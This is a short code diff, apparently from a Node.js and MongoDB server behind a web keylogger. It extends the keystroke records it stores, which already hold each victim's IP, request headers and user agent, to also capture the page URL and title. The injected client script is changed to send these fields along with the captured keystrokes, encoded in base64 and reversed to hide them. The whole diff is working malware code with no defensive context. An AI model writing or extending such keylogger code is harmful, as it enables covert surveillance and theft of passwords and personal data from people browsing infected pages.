@@ -692,6 +692,10 @@ MongoClient.connect(config.mongodb, function(err, db) {
 															keylogger: {
 																timestamp	: timestamp,
 																ip			: ip,
+																url			: {
+																	title: record[title],
+																	href: record[url]
+																},
 																browser: {
 																	headers		: req.headers,
 																	'user-agent': parseAgent(req.headers["user-agent"])
@@ -966,7 +970,9 @@ MongoClient.connect(config.mongodb, function(err, db) {
 							a: atob("` + btoa(req.query.project) + `"),
 							t: 1,
 							b: g,
-							c: f
+							c: f,
+							d: k.location.href,
+							j: d.title
 						}
 						` + sendToServer("p+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')") + `
 						f = []
